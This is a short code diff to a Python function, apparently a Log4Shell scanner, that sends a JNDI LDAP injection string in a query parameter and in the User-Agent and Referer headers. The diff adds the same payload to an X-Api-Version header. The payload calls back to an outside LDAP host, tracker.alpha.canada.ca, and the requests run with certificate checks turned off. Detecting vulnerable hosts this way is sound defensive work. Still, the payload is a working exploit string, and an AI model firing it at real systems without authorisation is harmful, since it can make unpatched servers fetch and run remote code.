@@ -27,7 +27,7 @@ def log4shell(domain):
     try:
         payload = "${jndi:ldap://tracker.alpha.canada.ca:1389/c=" + domain + "}"
         params = {'id':payload}
-        headers = {'User-Agent':payload, 'Referer':payload}
+        headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version': payload}
         print(f'Testing https://{domain}')
         get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
     except Exception as e:
